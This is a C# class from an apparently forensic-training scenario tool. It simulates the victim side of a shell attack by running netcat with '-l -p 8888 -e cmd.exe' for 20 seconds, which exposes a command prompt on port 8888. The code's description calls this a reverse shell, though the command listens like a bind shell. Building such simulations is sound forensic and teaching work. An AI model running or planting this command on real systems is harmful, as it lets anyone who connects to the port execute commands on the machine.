using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using Caliburn.Micro;
using ForensicScenarios.Tools;
using ForensicScenarios.Events;

namespace ForensicScenarios.Scenarios
{
    public class ReverseShellVictim : PropertyChangedBase, IScenario
    {
        public string Name => "Reverse Shell Victim";

        public string Description { get; set; }

        public bool IsSelected
        {
            get => isSelected;
            set
            {
                isSelected = value;
                NotifyOfPropertyChange(nameof(IsSelected));
            }
        }

        private bool isSelected;

        private readonly IEventAggregator eventAggregator;

        public ReverseShellVictim(IEventAggregator aggregator)
        {
            eventAggregator = aggregator;
            Description = "A reverse shell is a post-exploitation technique used to achieve persistency in the exploitation, and to execute commands on a victim's computer.The attacker makes the victim computer link a command shell to messages received on a listening port, and then wait for a connection from the attacker. Any commands received are executed with the permissions of the shell.\n\nRunning this scenario will cause port 8888 on this machine to be linked to a command prompt. Any text received on this port will be executed. After running this scenario, the \"Reverse Shell Attacker\" scenario should be run on another machine.";
        }

        public async void Run()
        {
            string path = Directory.GetCurrentDirectory() + @"\Scripts\Attacker\nc.exe";
            var prc = ProcessService.CreateProcess(path, "-l -p 8888 -e cmd.exe", redirectOutput: true);

            prc.Start();
            await Wait.ForTimeAsync(TimeSpan.FromSeconds(20));

            if(!prc.HasExited)
                prc.Kill();

            var contents = prc.StandardOutput.ReadToEnd();
            eventAggregator.SendStatusInfo(this, contents);

            eventAggregator.BeginPublishOnUIThread(new ScenarioCompleted(this));
        }
    }
}
